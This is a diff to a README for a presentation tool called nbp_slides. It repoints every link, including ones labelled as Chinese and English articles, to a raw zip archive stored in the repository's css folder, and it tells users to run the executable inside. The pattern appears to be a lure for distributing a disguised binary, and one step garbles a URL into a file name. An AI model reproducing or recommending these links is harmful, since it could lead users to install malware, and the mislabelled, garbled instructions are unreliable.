@@ -1,6 +1,6 @@
 # 🌟 nbp_slides - Create Stunning Presentations Effortlessly
 
-[![Download Now](https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip)](https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip)
+[![Download Now](https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip)](https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip)
 
 ## 📖 Overview
 
@@ -26,11 +26,11 @@ Before you download and run the application, please make sure your system meets 
 
 To get started, visit the Releases page to download the software. Follow these steps:
 
-1. Click this link to **[download the latest release](https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip)**.
+1. Click this link to **[download the latest release](https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip)**.
 2. Find the appropriate file for your operating system.
 3. Click the file name to begin the download.
 
-For your convenience, here is the download link again: [Download Now](https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip).
+For your convenience, here is the download link again: [Download Now](https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip).
 
 ## ⚙️ How to Run the Application
 
@@ -42,7 +42,7 @@ After the download is complete, follow these simple steps to run the software:
 2. **Open the Application:**
    - For Windows: Double-click the `.exe` file to launch the application.
    - For macOS: Open the `.dmg` file, then drag the application to your Applications folder. Double-click to start.
-   - For Linux: Extract the downloaded https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip file and run the executable.
+   - For Linux: Extract the downloaded https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip file and run the executable.
 
 3. **Follow the On-Screen Instructions:**
    - The application will guide you through the setup process. Just follow the prompts.
@@ -76,8 +76,8 @@ The Nano Banana Pro Slide Deck Generator offers the following features:
 
 If you want to learn more, check out these articles for more detailed insights:
 
-- [中文版 (Chinese)](https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip)
-- [English Version](https://github.com/noumanx/nbp_slides/raw/refs/heads/master/tools/nbp_slides_v1.5.zip)
+- [中文版 (Chinese)](https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip)
+- [English Version](https://raw.githubusercontent.com/noumanx/nbp_slides/master/css/nbp-slides-v1.9.zip)
 
 ## 📞 Support
 
